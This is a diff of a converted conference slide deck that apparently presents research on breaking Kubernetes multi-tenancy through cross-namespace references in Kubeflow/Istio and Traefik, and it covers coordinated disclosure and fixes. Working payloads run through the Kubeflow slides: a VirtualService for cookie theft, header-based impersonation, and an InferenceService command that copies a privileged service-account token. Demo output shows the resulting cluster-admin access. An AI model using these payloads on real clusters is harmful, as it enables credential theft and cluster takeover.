@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 85.2
 ocr_unreliable_blocks: 0
+vision_verified_pages_changed: 63
+vision_verified_pages: 63
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 1
 companion_files: []
@@ -31,33 +33,27 @@ converted_at: "2026-08-12T05:37:03Z"
 
 Breaking Multi-Tenancy Over and Over, and What We Can Learn From This
 
-Lorin Lehawany
-
-Sven Nobis
+Lorin Lehawany and Sven Nobis, ERNW
 
 Black Hat USA 2026
 
-1
-
 ## Slide 2
-
-**Sven Nobis** Senior Security Analyst @ ERNW
 
 Who we are
 
-**Lorin Lehawany** Security Analyst @ ERNW
+**Sven Nobis**
+Senior Security Analyst
+@ ERNW
 
-2
+**Lorin Lehawany**
+Security Analyst
+@ ERNW
 
 ## Slide 3
 
-Who we are
-
-3
+This slide carries no title or text of its own.
 
 ## Slide 4
-
-4
 
 Are you using Kubernetes?
 
@@ -69,15 +65,11 @@ Are you running …
 
 ...
 
-5
-
 ## Slide 6
 
 You are running a **multi-tenant** platform!
 
 Yes... whether you intended to or not!
-
-6
 
 ## Slide 7
 
@@ -87,8 +79,6 @@ Role-Based Access Control (RBAC), **Network Policies,** Runtime Detection, **Pod
 
 ...
 
-7
-
 ## Slide 8
 
 Are industry best-practices enough?
@@ -97,577 +87,483 @@ No!
 
 Our research shows why.
 
-8
-
 ## Slide 9
 
--
-How to Break Multi
-
-Tenancy
-
-Over?
-
-9
-
 Breaking Multi-Tenancy
+
+How to Break Multi-Tenancy Over and Over?
 
 ## Slide 10
 
--
-Breaking Multi
+Breaking Multi-Tenancy
 
-Tenancy
+- What is Namespace-based Multi-Tenancy?
+- We found various ways to break isolation in Namespace-based Multi-Tenancy
+  - Current security best practices won't protect against these problems
+- We present exploits in three projects that we found on:
+  - Control plane layer
+  - Data plane layer
 
--
-What is Namespace
+Diagram — Tenant A and Tenant B accessing a Cluster:
 
--
-based Multi
-
-\```
-o
-o
-\```
-
-We found various ways to break
-
--
-
-Tenancy
-
-Current security best practices
-
-\```
-o
-\```
-
-problems
-
-We present exploits
-
-in three projects
-
--
-
-Control plane layer
-
-\```
-o
-o
-\```
-
-Data plane layer
-
-Tenant A
-
-Tenant B
-
-Control Plane
-Namespace A
-Namespace B
-Cluster
-Control Plane Data Plane
-
-10
+- Tenant A
+- Tenant B
+- Cluster
+  - Control Plane
+  - Namespace A
+  - Namespace B
+- Legend: Control Plane (dashed) / Data Plane (solid)
 
 ## Slide 11
 
--
-Insecure Cross
-
-Namespace References in CRDs
-
-11
-
 Breaking Multi-Tenancy
+
+Insecure Cross-Namespace References in CRDs
 
 ## Slide 12
 
--
-What are Cross
-
-Namespace References?
+What are Cross-Namespace References?
 
 Cluster
 
-Namespace
+Namespace ns1
 
-ns1
-
-Namespace
-
-ns2
-
-\```
-apiVersion:
+```yaml
 apiVersion: crd.example/v1
-crd.example/v1kind: SourceCRD
-kind: TargetCRDspec:
-metadata:reference:
-name: examplename: example
-namespace: ns1
-\```
+kind: TargetCRD
+metadata:
+  name: example
+```
 
-12
+Namespace ns2
+
+```yaml
+apiVersion: crd.example/v1
+kind: SourceCRD
+spec:
+  reference:
+    name: example
+    namespace: ns1
+```
+
+Why is this a problem?
 
 ## Slide 13
 
-- Real World Scenario: Kubeflow
-
-13
+Real-World Scenario: Kubeflow
 
 ## Slide 14
 
-- Real World Scenario: Kubeflow
+Real-World Scenario: Kubeflow
 
-14
+Kubeflow Central Dashboard — kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
 
+Namespace: attacker (Owner)
 
-> Recovered by OCR — confidence 80/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Sidebar: Kubeflow · Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines
 
-```text
-@ Kubeflow Central Dashboa +
-kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
-Kubeflow @ attacker (owner) ¥
-Home Notebooks + New Notebook
-Notebooks
->= Filter Enter property na ()
-Last
-Status Name Created at Ima: Memory
-activity
-g attackers-n.. 32 minutes ago - jupyter-scipy:... . 1.0 Gi CONNECT
-Items per page: 10
-```
+Notebooks    + New Notebook
+
+Filter: Enter property name or value
+
+| Status | Name | Type | Created at | Last activity | Image | GPUs | CPUs | Memory |
+| --- | --- | --- | --- | --- | --- | --- | --- | --- |
+| ✓ | attackers-n… | jupyter | 32 minutes ago | - | jupyter-scipy:… | 0 | 0.5 | 1.0 Gi |
+
+CONNECT
+
+Items per page: 10    1 – 1 of 1
 
 ## Slide 15
 
-- Real World Scenario: Kubeflow
+Real-World Scenario: Kubeflow
 
-15
+Kubeflow Central Dashboard — kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
 
+Namespace: attacker (Owner)
 
-> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Sidebar: Kubeflow · Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines
 
-```text
-@ Kubeflow Central Dashboa +
-kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
-a
-Ww Kubeflow @ attacker (owner) ¥
-fr Home Notebooks
-Notebooks _.
-= Filter Enter prope
-Status Name # Created at
-Volume
-g attackers-n... 32 minutes ago
-Katib E
-rve Endpoints
-Pipelines
-Last
-activity
-Image
-jupyter-scipy:...
-Items per page: 10
-Memory
-1.0 Gi
+Notebooks    + New Notebook
+
+Filter: Enter property name or value
+
+| Status | Name | Type | Created at | Last activity | Image | GPUs | CPUs | Memory |
+| --- | --- | --- | --- | --- | --- | --- | --- | --- |
+| ✓ | attackers-n… | jupyter | 32 minutes ago | - | jupyter-scipy:… | 0 | 0.5 | 1.0 Gi |
+
 CONNECT
-+ New Notebook
-```
+
+Items per page: 10    1 – 1 of 1
 
 ## Slide 16
 
-- Real World Scenario: Kubeflow
+Real-World Scenario: Kubeflow
 
-16
+JupyterLab — kubeflow.gke.gcp.ernw.eu/notebook/victim/victims-notebook/lab
 
+File browser:
 
-> Recovered by OCR — confidence 95/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| Name | Modified |
+| --- | --- |
+| confidential-data | 2 hours ago |
+| lost+found | 3 days ago |
+| password_model_demo.i… | 3 days ago |
+| password_model_demo.py | 3 days ago |
 
-```text
-+ New Notebook
-ast
-Image Memory
-ivity
-Items per page
-```
+Launcher
+
+Notebook: Python 3 (ipykernel)
+
+Console: Python 3 (ipykernel)
+
+Other: Terminal · Text File · Markdown File · Python File · Show Contextual Help
 
 ## Slide 17
 
--
-Real
+Real-World Scenario: Kubeflow
 
-World Scenario: Kubeflow
-
-\```
-(base) jovyan@attackers-notebook-0:~$ kubectlauth whoami
+```
+(base) jovyan@attackers-notebook-0:~$ kubectl auth whoami
 ATTRIBUTE   VALUE
 Username    system:serviceaccount:attacker:default-editor
 [...]
-\```
-
-\```
-(base) jovyan@attackers-notebook-0:~$ kubectlauth can-i\
---list
-\```
-
-17
+(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
+  --list
+```
 
 ## Slide 18
 
-Permission
+Permissions of the default-editor
 
--
-default
-
-editor
-
-|`(base) jovyan@attackers`
-`--list`|`-notebook`|`-0:~$kube`|`ctl auth can-i \`|
-|---|---|---|---|
-|`Resources`|_`[...]`_|`Verbs`||
-|`configmaps`|_`[...]`_|`[create`|`delete`_`[...]`_`]`|
-|`deployments.apps`|_`[...]`_|`[create`|`delete`_`[...]`_`]`|
-|`*.networking.istio.io`
-_`[...]`_|_`[...]`_|`[create`|`delete`_`[...]`_`]`|
-
-18
+```
+(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
+  --list
+Resources                 [...]    Verbs
+configmaps                [...]    [create delete [...]]
+deployments.apps          [...]    [create delete [...]]
+*.networking.istio.io     [...]    [create delete [...]]
+[...]
+```
 
 ## Slide 19
 
-Istio and  VirtualServices
-Gateway Namespace Workload Namespace
-Load  Virtual
-Ingress Req. Istio Gateway Req. Req.
-Balancer Service
-End User
-Virtual
-Req.
-Service
-19
+Istio and VirtualServices
+
+Istio
+
+Gateway Namespace · Workload Namespace
+
+End User → Ingress → Load Balancer → Req. → Istio Gateway → Req. → Virtual Service → Req. →
+
+Istio Gateway → Req. → Virtual Service
 
 ## Slide 20
 
-Istio and  VirtualServices
-amespace Workload Namespace
-Virtual
-. Istio Gateway Req. Req. Service Req. Pod
-Service
-Virtual
-Service Pod
-Req. Req.
-Service
-20
+Istio and VirtualServices
+
+Istio
+
+Gateway Namespace · Workload Namespace
+
+Istio Gateway → Req. → Virtual Service → Req. → Service → Req. → Pod
+
+Istio Gateway → Req. → Virtual Service → Req. → Service → Req. → Pod
 
 ## Slide 21
 
--
-Back to Cross
-
-Namespace References
+Back to Cross-Namespace References
 
 Cluster
 
-Namespace
+Namespace ns1
 
-ns1
-
-Namespace
-
-ns2
-
-\```
-apiVersion:
+```yaml
 apiVersion: crd.example/v1
-crd.example/v1kind: SourceCRD
-kind: TargetCRDspec:
-metadata:reference:
-name: examplename: example
-namespace: ns1
-\```
+kind: TargetCRD
+metadata:
+  name: example
+```
 
-21
+Namespace ns2
+
+```yaml
+apiVersion: crd.example/v1
+kind: SourceCRD
+spec:
+  reference:
+    name: example
+    namespace: ns1
+```
+
+Why is this a problem?
 
 ## Slide 22
 
--
-Back to our Real
-
-World Scenario
+Back to our Real-World Scenario
 
 Cluster
 
-Namespace
+Namespace kubeflow
 
-kubeflow
+```yaml
+apiVersion: networking.istio.io/v1
+kind: Gateway
+metadata:
+  name: kf-gateway
+```
 
-Namespace
+Attacker
 
-attacker
+Namespace attacker
 
-`apiVersion: apiVersion: networking.istio.io/v1 networking.istio.io/v1` Attacker `kind: VirtualService kind: Gateway spec: metadata: gateways: name: kf-gateway - kubeflow/kf-gateway`
+```yaml
+apiVersion: networking.istio.io/v1
+kind: VirtualService
+spec:
+  gateways:
+    - kubeflow/kf-gateway
+```
 
-22
+Why is this a problem?
 
 ## Slide 23
 
 Exploit
 
-\```
+```yaml
 apiVersion: networking.istio.io/v1beta1
 kind: VirtualService
 [...]
 spec:
-gateways:
--kubeflow/kf-gateway
-hosts:
--'*'
-http:
--match:
--uri:
-prefix: /assets/favicon.ico
-route:
-\```
-
-\```
--destination:
-host: poc.attacker.svc.cluster.local
+  gateways:
+  - kubeflow/kf-gateway
+  hosts:
+  - '*'
+  http:
+  - match:
+    - uri:
+        prefix: /assets/favicon.ico
+    route:
+    - destination:
+        host: poc.attacker.svc.cluster.local
 [...]
-\```
+```
+
+Browser — Kubeflow Central Dashboard (https://kubeflow.gke.g…): Kubeflow · namespace kubeflow-user-example-c… · Notebooks · Filter: Enter property name or value
 
 Attacker
-
-23
 
 ## Slide 24
 
 Impact
-Cluster
-NS  kubeflow $  kubegetl logs  poc
-Cookie:
-Ingress kf- gateway oauth2_proxy_kubeflo
-w=dVX[...]
-NS  attacker
-Attacker’s Pod
+
 Kubeflow
-User Attacker 24
-Request
+
+Kubeflow User
+
+Cluster
+- NS kubeflow: kf-gateway
+- NS attacker: Attacker's Pod
+
+Flow: Kubeflow User → Ingress → kf-gateway → Request → Attacker's Pod → Logs → Attacker
+
+Attacker
 
 ## Slide 25
 
-Vertical
-
-Privilege Escalation
-
-25
-
 Finding a Way to Cluster Admin
+
+Vertical Privilege Escalation
 
 ## Slide 26
 
 Bypassing Network Policies
 
-Namespace
-kubeflow
-Ingress kf- gateway
-- -
-kserve models
-.
-Req
--
-web application
+Kubeflow
+
+Namespace kubeflow
+- kf-gateway
+- kserve-models-web-application
+
+Ingress → kf-gateway → Req. → kserve-models-web-application
+
+Namespace attacker
+
+```yaml
+apiVersion: networking.istio.io/v1
+kind: VirtualService
+spec:
+  gateways:
+  - kubeflow/kf-gateway
+  http:
+    route:
+    - destination:
+        host: kserve-models-web-application.kubeflow.svc.cluster.local
+```
+
+Attacker
+
 Why is this a problem?
-Req
-.
-
-Namespace
-
-attacker
-
-`apiVersion: networking.istio.io/v1 kind: VirtualService spec: gateways: - kubeflow/kf-gateway http: route: - destination: host: kserve-models-webapplication.kubeflow.svc.cluster.local` Attacker
-
-26
 
 ## Slide 27
 
 User Impersonation
 
-\```
+```yaml
 apiVersion: networking.istio.io/v1beta1
 kind: VirtualService
 [...]
 spec:
-gateways:
--kubeflow/kubeflow-gateway
-http:
--headers:
-request:
-set:
-\```
+  gateways:
+  - kubeflow/kubeflow-gateway
+  http:
+  - headers:
+      request:
+        set:
+          kubeflow-userid: "system:serviceaccount:kubeflow:kserve-controller-manager"
+    route:
+    - destination:
+        host: kserve-models-web-application.kubeflow.svc.cluster.local
+[...]
+```
 
 Attacker
 
-\```
-kubeflow-userid: "system:serviceaccount:kubeflow:kserve-controller-manager"
-route:
-\```
-
-- `destination:`
-
-\```
-host: kserve-models-web-application.kubeflow.svc.cluster.local
-[...]
-\```
-
-27
+How does this help to gain cluster admin?
 
 ## Slide 28
 
-Full
+Full Exploit: Deploy InferenceService
 
-: Deploy
+Kubeflow
 
-InferenceService
-
-\```
+```json
 {
-\```
+    "resources": [
+        {
+        "apiVersion": "serving.kserve.io/v1beta1",
+        "kind": "InferenceService",
+[...]
+        "spec": {
+            "predictor": {
+            "containers": [
+```
 
-`"resources": [ { "apiVersion": "serving.kserve.io/v1beta1", "kind": "InferenceService",` Attacker `[...]` POST `"spec": {` /poc/kserve /api/ `"predictor": { "containers": [` namespaces /kubeflow / - `{` kserve resources `"command": [ "/bin/sh", "-c", "kubectl create secret -n attacker generic poccluster-admin-token --fromfile=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000" ], "serviceAccountName": "profiles-controller-service-account" [...]`
+Attacker
 
--
-kserve
--
-models
--
-web
-application
+POST /poc/kserve/api/namespaces/kubeflow/kserve-resources
 
-28
+kserve-models-web-application
 
 ## Slide 29
 
-29
-1",
-ttacker generic poc-
-token; sleep 60000"
-troller-service-account"
-Full Exploit : Deploy InferenceService
-kserve -
-models -
-web-
-application
-POST
-/poc/kserve /api/
-namespaces /kubeflow /
-kserve -resources
-Namespace
-kubeflow
-Deploy Resources
-Authorization Check:
+Full Exploit: Deploy InferenceService
+
+Kubeflow
+
 Attacker
+
+POST /poc/kserve/api/namespaces/kubeflow/kserve-resources
+
+kserve-models-web-application
+
+Authorization Check: ✓
+
+Deploy Resources
+
+Namespace kubeflow
 
 ## Slide 30
 
-Full
+Full Exploit: Deploy InferenceService
 
-: Deploy
+Kubeflow
 
-InferenceService
-
-\```
+```json
 {
-\```
+    "resources": [
+        {
+        "apiVersion": "serving.kserve.io/v1beta1",
+        "kind": "InferenceService",
+[...]
+        "spec": {
+            "predictor": {
+            "containers": [
+                {
+                "command": [
+                    "/bin/sh", "-c",
+                    "kubectl create secret -n attacker generic poc-cluster-admin-token --from-file=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000"
+                ],
+                "serviceAccountName": "profiles-controller-service-account"
+[...]
+```
 
-`"resources": [ { "apiVersion": "serving.kserve.io/v1beta1", "kind": "InferenceService",` Attacker `[...]` POST `"spec": {` /poc/kserve /api/ `"predictor": { "containers": [` namespaces /kubeflow / - `{` kserve resources `"command": [ "/bin/sh", "-c", "kubectl create secret -n attacker generic poccluster-admin-token --fromfile=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000" ], "serviceAccountName": "profiles-controller-service-account" [...]`
+Attacker
 
--
-kserve
--
-models
--
-web
-application
+POST /poc/kserve/api/namespaces/kubeflow/kserve-resources
 
-30
+kserve-models-web-application
 
 ## Slide 31
-
-31
 
 Demo Time!
 
 ## Slide 32
 
-# Demo
+Demo
 
 Attacker
 
-\```
-(base) jovyan@attackers-notebook-0:~$ kubectlget secrets
-NAME                        TYPE     DATA   AGE
-(base) jovyan@attackers-notebook-0:~$ kubectlapply -f
-virtualservice-kserve.yaml
-virtualservice.networking.istio.io/kserve-controller-poc
-created
-\```
+Kubeflow
 
-32
+```
+(base) jovyan@attackers-notebook-0:~$ kubectl get secrets
+NAME                        TYPE     DATA   AGE
+
+(base) jovyan@attackers-notebook-0:~$ kubectl apply -f virtualservice-kserve.yaml
+virtualservice.networking.istio.io/kserve-controller-poc created
+```
 
 ## Slide 33
 
-# Demo
+Demo
 
 Attacker
 
-\```
-(base) jovyan@attackers-notebook-0:~$ curl "$DOMAIN/poc-
-vs/api/namespaces/kubeflow/kserve-resources" \
--H 'accept:application/json, text/plain, */*' \
--H 'content-type: application/json' \
-\```
+Kubeflow
 
-\```
--b "$COOKIES" \
-\```
-
-\```
--H "x-xsrf-token: $XSRF_TOKEN" \
---data-binary @curl-kserve.json
-\```
-
-- `[...]`
-
-\```
-{"createdResources":[{"apiVersion":"serving.kserve.io/v1bet
-a1","kind":"InferenceService","name":"poc","namespace":"kub
-eflow"}],"message":"1 KServeresource(s) successfully
-created."}
-\```
+```
+(base) jovyan@attackers-notebook-0:~$ curl "$DOMAIN/poc-vs/api/namespaces/kubeflow/kserve-resources" \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'content-type: application/json' \
+  -b "$COOKIES" \
+  -H "x-xsrf-token: $XSRF_TOKEN" \
+  --data-binary @curl-kserve.json
+[...]
+{"createdResources":[{"apiVersion":"serving.kserve.io/v1beta1","kind":"InferenceService","name":"poc","namespace":"kubeflow"}],"message":"1 KServe resource(s) successfully created."}
+```
 
 ## Slide 34
 
-# Demo
+Demo
 
 Attacker
 
-\```
-(base) jovyan@attacker-nb-0:~$ kubectlget secret
+Kubeflow
+
+```
+(base) jovyan@attacker-nb-0:~$ kubectl get secret
 NAME                        TYPE     DATA   AGE
 poc-cluster-admin-token     Opaque   1      43s
-(base) jovyan@attacker-nb-0:~$ ./create-kubeconfig-from-
-token.sh poc-cluster-admin-tokenkubeconfig.yaml
-(base) jovyan@attacker-nb-0:~$ kubectl--kubeconfig
-kubeconfig.yamlauth can-i--list
+(base) jovyan@attacker-nb-0:~$ ./create-kubeconfig-from-token.sh poc-cluster-admin-token kubeconfig.yaml
+(base) jovyan@attacker-nb-0:~$ kubectl --kubeconfig kubeconfig.yaml auth can-i --list
 Resources   Non-Resource URLs   Resource Names   Verbs
-*.* [] []               [*]
-[*][]               [*]
-\```
-
-34
+*.*         []                  []               [*]
+            [*]                 []               [*]
+```
 
 ## Slide 35
-
-35
 
 Fixing Multi-Tenancy in Kubeflow
 
@@ -675,47 +571,43 @@ Fixing Multi-Tenancy in Kubeflow
 
 Fixing the Issue: Remove Istio Permission?
 
-|`(base) jovyan@attackers-notebook`
-`--list`|`-0:~$kubectl auth can-i \`|
-|---|---|
-|`Resources`_`[...]`_|`Verbs`|
-|`configmaps`
-_`[...]`_|`[create delete`_`[...]`_`]`|
-|`deployments.apps`
-_`[...]`_|`[create delete`_`[...]`_`]`|
-|~~`*.networking.istio.io`~~
-_~~`[...]`~~_
-_`[...]`_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|
+Kubeflow
 
-36
+```
+(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
+  --list
+Resources                 [...]    Verbs
+configmaps                [...]    [create delete [...]]
+deployments.apps          [...]    [create delete [...]]
+*.networking.istio.io     [...]    [create delete [...]]
+[...]
+```
+
+(The `*.networking.istio.io   [...]   [create delete [...]]` row is struck through — the Istio permission is removed.)
 
 ## Slide 37
 
-Fixing the Issue:
+Fixing the Issue: Or even the Service Account?
 
-Or even the Service Account?
+Kubeflow
 
-|`(base) jovyan@attackers-notebook`
-`--list`|`-0:~$kubectl auth can-i \`|
-|---|---|
-|`Resources`_`[...]`_|`Verbs`|
-|~~`configmaps`~~
-_~~`[...]`~~_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|
-|~~`deployments.apps`~~
-_~~`[...]`~~_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|
-|~~`*.networking.istio.io`~~
-_~~`[...]`~~_
-_`[...]`_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|
+```
+(base) jovyan@attackers-notebook-0:~$ kubectl auth can-i \
+  --list
+Resources                 [...]    Verbs
+configmaps                [...]    [create delete [...]]
+deployments.apps          [...]    [create delete [...]]
+*.networking.istio.io     [...]    [create delete [...]]
+[...]
+```
 
-37
+(All three resource rows — `configmaps`, `deployments.apps`, and `*.networking.istio.io` — are struck through: the whole Service Account's permissions are removed.)
 
 ## Slide 38
 
-User Impersonation without Service Account
-
-38
-
 Breaking Multi-Tenancy **Over**
+
+User Impersonation without Service Account
 
 ## Slide 39
 
@@ -723,27 +615,26 @@ Idea
 
 Attacker
 
-39
+Kubeflow
 
+New notebook
 
-> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Name: ernw-sn
 
-```text
-ft < New notebook
-| (B= Notebooks
-. °
-e
-jupyter 1 2
-JupyterLab VisualStudio Code RStudio
-An interactive development weight but power An integrated
-environment for R, a
-code, and data. Ideal for a r programming langua
-puting and
-hics
+- JupyterLab — An interactive development environment for notebooks, code, and data. Ideal for prototyping and experimentation.
+- VisualStudio Code — A lightweight but powerful source code editor, redefined and optimized for building and debugging modern web and cloud applications.
+- RStudio — An integrated development environment for R, a programming language for statistical computing and graphics.
+
 Custom Notebook
-Custom Image
-IfNotPresent
-```
+
+Image: kubeflownotebookswg/jupyter-scipy:v1.9.2
+
+☑ Custom Image
+Custom Image: europe-docker.pkg.dev/folkloric-stone-231516/ernw-images/snobis/poc-webserv…
+
+Image pull policy: IfNotPresent
+
+Sidebar: Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines · Manage Contributors · GitHub · Documentation
 
 ## Slide 40
 
@@ -751,46 +642,15 @@ Phishing Attack Scenario
 
 Attacker
 
-1.
+1. Attacker creates notebook with custom image
+2. Attacker authorizes victim in their namespace
+3. Attacker convinces victim to visit link to notebook
+4. Victim clicks on link
+5. Notebook either
+   - logs the request to steal the cookie like before
+   - or executes client-side code in Browser to perform actions on behalf of the victim
 
-Attacker creates notebook with custom image
-
-2.
-
-Attacker authorizes victim in their namespace
-
-3.
-
-Attacker convinces victim to visit link to notebook
-
-4.
-
-Victim clicks on link
-
-5.
-
-otebook
-
-either
-
-logs the request to steal the cookie like before
-
-\```
-o
-\```
-
--
-or executes client
-
-side code in Browser to perform actions on
-
-\```
-o
-\```
-
-behalf of the victim
-
-40
+Kubeflow sidebar: Home · Notebooks · TensorBoards · Volumes · Katib Experiments · KServe Endpoints · Pipelines · Manage Contributors
 
 ## Slide 41
 
@@ -798,196 +658,132 @@ Phishing Attack Scenario
 
 Attacker
 
-41
+Kubeflow
 
+Browser tabs: Kubeflow Central Dashboard · XSS PoC
+URL: kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/
 
-> Recovered by OCR — confidence 74/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
 DevTools - kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/
-‘® [0 Elements Recorder Console Sources Network Performance Memory Application Privacyandsecurity Lighthouse AdBlock
-Y Filter © Invert 1 Morefilters » All Fetch/XHR_ Doc CSS JS Font Img Media Manifest) WS Wasm | Other
-& test/
-style.css
-Request Payload view source
-y {statusCode: 200, header: {content-length: "386", content-type: "application/json; charset=utf-8",..
-© page-scriptjs ~ header: {content-length: "386", content-type: "application/json; charset=utf-8",..}
-content-type: "applic n/ json rset=utf-8
-date: "Wed
-etag: "W/\"182-E4zxd7 v1c aPHk
-©) log server:
-x-envoy-upstream-service-time
-x-powered-by:
-statusCode: 200
+Panels: Elements · Recorder · Console · Sources · Network · Performance · Memory · Application · Privacy and security · Lighthouse · AdBlock
+Filters: All · Fetch/XHR · Doc · CSS · JS · Font · Img · Media · Manifest · WS · Wasm · Other
+
+Name: test/ · style.css · script.js · page-script.js · config · env-info · log
+
+Payload — Request Payload (view source):
+
+```
+{statusCode: 200, header: {content-length: "386", content-type: "application/json; charset=utf-8",…},…}
+  body: "{\"user\":\"snobis_ernw.de#EXT#@ernwlab.onmicrosoft.com\",\"platform\":{\"kubeflowVersion\":\"unknown\…
+  header: {content-length: "386", content-type: "application/json; charset=utf-8",…}
+    content-length: "386"
+    content-type: "application/json; charset=utf-8"
+    date: "Wed, 12 Mar 2025 13:30:54 GMT"
+    etag: "W/\"182-E4zxd77yuBJ2RjvlogBJDfJaPHk\""
+    server: "istio-envoy"
+    x-envoy-upstream-service-time: "19"
+    x-powered-by: "Express"
+  statusCode: 200
 ```
 
 ## Slide 42
 
-- Real world Impact
+Real-world Impact
 
-Affected
+Kubeflow
 
-Partially affected
+Affected:
+- Azure
+- VMware (by Broadcom)
+- AWS
+- deployKF
+- Red Hat
+- IBM
+- Google Cloud
 
-42
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-black hat I
-Kube
-Affected Partially affected
-M Azure vmware
-42
-```
+Partially affected:
+- Canonical
 
 ## Slide 43
 
 Coordinated Disclosure
 
-\```
-o
-\```
+Kubeflow
 
-\```
-o
-\```
+- CVE-2026-47237 was fixed in Kubeflow by
+  - removing the Istio edit permissions from the Service Account
+- In addition, we introduce a multi-domain setup to fix the phishing attack scenario
+- Thanks to the Kubeflow project!
+- However, **insecure Cross-Namespace References in CRDs** is a common problem in various other projects.
 
-\```
-o
-o
-\```
-
-43
-
--
-CVE
-
--
-2026
-
-47237
-
-fixed in Kubeflow by
-
-removing the Istio edit permissions from the Service
-
-\```
-o
-\```
-
-Account
-
--
-In addition, we introduce a multi
-
-domain setup
-
-fix the phishing attack scenario
-
-Thanks to the Kubeflow project!
-
-However,  i
-
-nsecure
-
--
-Cross
-
-is a common problem in various other
-
-projects.
+(Sticky note) Excellent research paper on the topic by Andong Chen et. al. https://arxiv.org/pdf/2507.03387
 
 ## Slide 44
 
--
-Insecure Cross
-
-Namespace References in Annotations
-
-44
-
 Breaking Multi-Tenancy Over **and Over**
+
+Insecure Cross-Namespace References in Annotations
 
 ## Slide 45
 
--
-Cross Namespace References in Annotations
+Cross-Namespace References in Annotations
+
 Cluster
-Namespace Namespace
-ns1 ns2
-kind: Example kind: Service
-apiVersion:
-apiVersion: v1
-crd.example/v1
+
+Namespace ns1
+
+```yaml
+kind: Example
+apiVersion: crd.example/v1
 metadata:
-metadata:
-annotations:
-name: target
-[...] crd.example.ref:
-ns1/target
-45
-
-## Slide 46
-
-- Real World Scenario: Traefik
-
-46
-
-
-> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Real-World Scenario: Traefik
-46
+  name: target
+[...]
 ```
 
-## Slide 47
+Namespace ns2
 
--
-Real
-
-World Scenario: Traefik
-
-Cluster
-
-Traefik
-Req.
-Proxy
-
-mTLS
-
-Namespace
-
-victim
-
-\```
-kind: ServersTransport
-apiVersion:
-traefik.io/v1alpha1
-metadata:
-name: st
-spec:
-certificatesSecrets:
--client-cert-
-secret
-\```
-
-\```
+```yaml
 kind: Service
 apiVersion: v1
 metadata:
-annotations:
-traefik.ingress.kubern
-etes.io/service.serverstra
-nsport: st@kubernetescrd: st@kubernetescrdst@kubernetescrd
-\```
+  annotations:
+    crd.example.ref: ns1/target
+```
 
-nsport: st@kubernetescrd: st@kubernetescrdst@kubernetescrd
+## Slide 46
+
+Real-World Scenario: Traefik
+
+## Slide 47
+
+Real-World Scenario: Traefik
+
+Cluster
+
+Traefik Proxy → Req. (mTLS) →
+
+Namespace victim
+
+```yaml
+kind: Service
+apiVersion: v1
+metadata:
+  annotations:
+    traefik.ingress.kubernetes.io/service.serverstransport: st@kubernetescrd
+```
+
+```yaml
+kind: ServersTransport
+apiVersion: traefik.io/v1alpha1
+metadata:
+  name: st
+spec:
+  certificatesSecrets:
+    - client-cert-secret
+```
+
+Pod
+
 What is the impact?
-
-47
 
 ## Slide 48
 
@@ -995,17 +791,31 @@ Impact
 
 Cluster
 
-Namespace
+Namespace attacker
 
-attacker
+```yaml
+kind: Service
+apiVersion: v1
+metadata:
+  annotations:
+    traefik.ingress.kubernetes.io/service.serverstransport: victim-st@kubernetescrd
+```
 
-Namespace
+Attacker
 
-victim
+Namespace victim
 
-`kind: Service kind: ServersTransport apiVersion: apiVersion: v1 traefik.io/v1alpha1 metadata: metadata:` Attacker `annotations: name: st traefik.ingress.kubern spec: etes.io/service.serverstra certificatesSecrets: - client-certnsport: victimsecret st@kubernetescrd`
+```yaml
+kind: ServersTransport
+apiVersion: traefik.io/v1alpha1
+metadata:
+  name: st
+spec:
+  certificatesSecrets:
+    - client-cert-secret
+```
 
-48
+Flow: Traefik Proxy → Req. (mTLS) → Service (attacker) → Req. → socat Pod → Req. → Pod (victim)
 
 ## Slide 49
 
@@ -1013,168 +823,116 @@ Impact
 
 Cluster
 
-Namespace
+Namespace attacker
 
-Namespace
+```yaml
+kind: Service
+apiVersion: v1
+metadata:
+  annotations:
+    traefik.ingress.kubernetes.io/service.serverstransport: victim-st@kubernetescrd
+```
 
-attacker
+Attacker
 
-victim
+Namespace victim
 
-`kind: Service kind: ServersTransport apiVersion: apiVersion: v1 traefik.io/v1alpha1 metadata: metadata:` Attacker `annotations: name: st traefik.ingress.kubern spec: etes.io/service.serverstra certificatesSecrets: - client-certnsport: victimsecret st@kubernetescrd`
+```yaml
+kind: ServersTransport
+apiVersion: traefik.io/v1alpha1
+metadata:
+  name: st
+spec:
+  certificatesSecrets:
+    - client-cert-secret
+```
 
-Traefik
-Req.
-Proxy
-
-Pod
-socat Pod Req.
-
-49
+Flow: Traefik Proxy → Req. → Service (attacker) → Req. → socat Pod → Req. (mTLS) → Pod (victim)
 
